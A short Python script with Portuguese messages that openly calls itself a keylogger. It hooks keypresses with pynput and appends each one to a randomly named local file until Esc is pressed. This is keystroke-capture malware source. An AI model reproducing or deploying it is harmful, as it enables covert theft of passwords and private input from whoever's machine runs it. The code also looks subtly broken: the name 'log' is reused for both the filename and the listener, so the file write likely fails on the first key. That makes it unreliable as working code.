from pynput.keyboard import Listener,Key
import sys
import random

def encerrar_keylogger():
    print('keylogger encerrado')
    sys.exit()
def escrita_keylogger(key):
        try:
            with open(log, 'a') as file:
                file.write(f'{str(key)} \n ')
        except Exception as e:
            print(f'erro ao capturar digito{e} ')
            encerrar_keylogger()
        if key == key.esc:
                encerrar_keylogger()
log = f'arquivologger{random.randint(0,1000)}.txt'

print('keylogger capturando')
with Listener(on_press=escrita_keylogger) as log:
        try:
            log.join()
        except Exception as e:
            print('Erro durante a captura de tecla')
        finally:
            log.stop()
            encerrar_keylogger()
